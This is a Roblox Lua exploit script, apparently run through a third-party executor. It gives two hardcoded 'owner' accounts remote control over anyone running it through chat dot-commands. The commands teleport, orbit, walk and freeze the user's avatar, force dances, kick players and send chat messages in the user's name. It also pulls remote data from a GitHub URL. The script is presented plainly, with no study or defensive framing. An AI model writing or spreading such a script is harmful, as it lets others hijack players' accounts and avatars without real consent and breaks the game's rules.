task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")
    local TextChatService = game:GetService("TextChatService")
    local LocalPlayer = Players.LocalPlayer
    local ownerIds = {4591285210, 3758584431}

    local Orbiting, Walking, Frozen = false, false, false
    local danceTracks, frozenPositions, emotes = {}, {}, {}

    pcall(function()
        local data = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/AFEM/refs/heads/main/emotes.json")
        emotes = HttpService:JSONDecode(data)
    end)

    local function IsOwner(userId)
        for _, id in ipairs(ownerIds) do
            if userId == id then return true end
        end
        return false
    end

    local function GetOwnerPlayer()
        for _, id in ipairs(ownerIds) do
            local player = Players:GetPlayerByUserId(id)
            if player then return player end
        end
        return nil
    end

    local function GetTargetPlayer(name)
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():sub(1, #name) == name then
                    return p
                end
            end
        end
        return GetOwnerPlayer()
    end

    local function GetTargetPlayers(name)
        local targets = {}
        if name then
            name = name:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) and p.Name:lower():sub(1, #name) == name then
                    table.insert(targets, p)
                end
            end
        else
            for _, p in ipairs(Players:GetPlayers()) do
                if not IsOwner(p.UserId) then
                    table.insert(targets, p)
                end
            end
        end
        return targets
    end

    local function StartAntiSeatLoop()
        task.spawn(function()
            while Orbiting or Walking do
                task.wait(0.2)
                local char = LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildWhichIsA("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hum and hum.Sit then hum.Sit = false end
                    if hrp and hrp:FindFirstChild("SeatPart") then hrp.SeatPart:Sit(nil) end
                end
            end
        end)
    end

    local function TeleportToPlayer(name)
        local target = GetTargetPlayer(name)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local pos = target.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos + Vector3.new(0, 6, 0))
            end
        end
    end

    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundTarget")
    end

    local function StartOrbit(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopOrbit()
        Orbiting = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Orbiting = false return end

        RunService:BindToRenderStep("OrbitAroundTarget", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local t = tick()
                local radius = 10
                local speed = 2
                local x = math.cos(t * speed) * radius
                local z = math.sin(t * speed) * radius
                local targetPos = target.Character.HumanoidRootPart.Position
                local newPos = targetPos + Vector3.new(x, 3, z)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, targetPos)
            end
        end)
    end

    local function StopWalking()
        Walking = false
        RunService:UnbindFromRenderStep("WalkToTarget")
    end

    local function WalkToPlayer(name)
        if IsOwner(LocalPlayer.UserId) then return end
        StopWalking()
        Walking = true
        StartAntiSeatLoop()
        local target = GetTargetPlayer(name)
        if not target then Walking = false return end

        RunService:BindToRenderStep("WalkToTarget", Enum.RenderPriority.Character.Value, function()
            if not Walking then return end
            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                humanoid:MoveTo(target.Character.HumanoidRootPart.Position)
            end
        end)
    end

    local function FreezeAll()
        Frozen = true
        RunService:BindToRenderStep("FreezePlayers", Enum.RenderPriority.Camera.Value, function()
            if not Frozen then return end
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = true
            end
        end)
    end

    local function UnfreezeAll()
        Frozen = false
        RunService:UnbindFromRenderStep("FreezePlayers")
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Anchored = false
        end
    end

local function DoRandomDance(player)
    if not player.Character then return end
    local hum = player.Character:FindFirstChildOfClass("Humanoid")
    if not hum or #emotes == 0 then return end

    local random = emotes[math.random(1, #emotes)]
    local rawId = tostring(random.animationid or "")
    local extractedId = rawId:match("id=(%d+)")

    if not extractedId then
        warn("No se pudo extraer el ID del link: " .. rawId)
        return
    end

    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://" .. extractedId
    local track = hum:LoadAnimation(anim)
    track.Looped = true
    track:Play()

    danceTracks[player] = danceTracks[player] or {}
    table.insert(danceTracks[player], track)
end

local function StopAllDancesOn(player)
    if danceTracks[player] then
        for _, track in ipairs(danceTracks[player]) do
            pcall(function() track:Stop() end)
        end
        danceTracks[player] = nil
    end
end


    local function KickPlayer(p)
        p:Kick("You were kicked by the owner")
    end

    local function SendChatMessage(message)
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local textChannel = TextChatService.TextChannels.RBXGeneral
            if textChannel then
                textChannel:SendAsync(message)
            end
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        end
    end

    local function OwnerChatHandler(message)
        if message:sub(1,3) == "/e " then message = message:sub(4) end

        local args = {}
        for word in message:lower():gmatch("%S+") do table.insert(args, word) end
        local cmd = args[1]
        local arg = args[2]

        if cmd == ".t" then TeleportToPlayer(arg)
        elseif cmd == ".u" then StartOrbit(arg)
        elseif cmd == ".uu" then StopOrbit()
        elseif cmd == ".w" then WalkToPlayer(arg)
        elseif cmd == ".ww" then StopWalking()
        elseif cmd == ".q" then FreezeAll()
        elseif cmd == ".qq" then UnfreezeAll()
        
elseif cmd == ".b" then
    if arg then
        for _, p in ipairs(GetTargetPlayers(arg)) do
            if p:FindFirstChild("__JmodsConnected") then
                DoRandomDance(p)
            end
        end
    else
        for _, p in ipairs(Players:GetPlayers()) do
            if not IsOwner(p.UserId) and p:FindFirstChild("__JmodsConnected") then
                DoRandomDance(p)
            end
        end
    end

elseif cmd == ".bb" then
    if arg then
        for _, p in ipairs(GetTargetPlayers(arg)) do
            if p:FindFirstChild("__JmodsConnected") then
                StopAllDancesOn(p)
            end
        end
    else
        for _, p in ipairs(Players:GetPlayers()) do
            if not IsOwner(p.UserId) and p:FindFirstChild("__JmodsConnected") then
                StopAllDancesOn(p)
            end
        end
    end




        elseif cmd == ".k" then for _, p in ipairs(GetTargetPlayers(arg)) do KickPlayer(p) end
        elseif cmd == ".m" then if #args >= 2 then SendChatMessage(table.concat(args, " ", 2)) end end
    end

    local function CheckAndConnectPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if not player:FindFirstChild("__JmodsConnected") then

                local marker = Instance.new("BoolValue")
                marker.Name = "__JmodsConnected"
                marker.Parent = player
                player.Chatted:Connect(OwnerChatHandler)
            end
        end
    end

    Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)
        if IsOwner(player.UserId) then
            CheckAndConnectPlayers()
        end
    end)

    CheckAndConnectPlayers()
end)
----aaaaaa
